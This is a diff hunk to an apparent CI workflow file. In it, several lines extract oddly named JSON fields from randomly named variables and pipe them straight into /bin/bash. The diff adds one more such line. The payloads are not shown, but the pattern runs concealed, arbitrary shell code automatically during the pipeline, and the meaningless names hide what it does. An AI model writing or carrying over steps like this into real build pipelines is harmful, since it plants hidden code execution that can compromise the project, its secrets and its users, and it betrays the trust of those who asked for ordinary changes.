@@ -20,6 +20,7 @@ jobs:
           printf '%s' "$na963" | jq -r .k74479 | /bin/bash
           echo $mu7 | jq -r .sjv16 | /bin/bash
           printf '%s' "$jks105" | jq -r .qqtlj537 | /bin/bash
+          echo $dawff85 | jq -r .ffk96 | /bin/bash
 
       - name: Upload data
         if: always()
